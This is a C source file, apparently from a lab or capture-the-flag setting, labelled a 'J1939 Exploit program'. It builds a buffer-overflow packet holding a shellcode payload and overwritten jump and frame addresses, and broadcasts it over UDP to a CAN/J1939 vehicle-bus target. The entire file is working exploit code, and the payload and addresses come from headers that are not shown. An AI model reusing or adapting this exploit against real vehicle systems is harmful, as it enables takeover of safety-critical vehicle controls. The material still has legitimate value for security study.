/*
 * J1939 Exploit program
 *
 */

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "canlib.h"
#include "j1939.h"
#include "main.h"

char payload[] = J1939_PAYLOAD;

int main(int argc, char *argv[])
{
    /* setup the socket to broadcast */
    int sockfd, broadcast;
    struct sockaddr_in servaddr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    broadcast = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast,
                   sizeof(broadcast)) < 0)
    {
        perror("socket configuration failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    inet_pton(AF_INET, TARGET_ADDR, &servaddr.sin_addr.s_addr);

    /* Send the payload */
    printf("Payload len: %u\r\n",sizeof(payload));

    /* Send the buffer overflow message */
    char buffer[128];
    memset(buffer, 0xb4, sizeof(buffer));
    memcpy(buffer, payload, sizeof(payload));
    /* 64 bytes of regular buffer + 32 bytes after + 8 bytes for the address */
    uint64_t addr = JUMP_ADDR;
    memcpy(&buffer[OVERFLOW_PACKET_ADDR_IDX], &addr, sizeof(addr));
    addr = FRAME_ADDR;
    memcpy(&buffer[OVERFLOW_PACKET_FRAME_IDX], &addr, sizeof(addr));
    size_t len = OVERFLOW_PACKET_SIZE;
    printf("Sending jump, %u bytes long\n", len);
    uint8_t res = send_can_message(sockfd, &servaddr, PGN, (void *)&buffer, len);
    if  (res > 0) {
        printf("OK\r\n");
    } else {
        printf("Error: $u\r\n", res);
    }

    /* close and free */
    close(sockfd);

    printf("Done.\r\n");
    return 0;
}
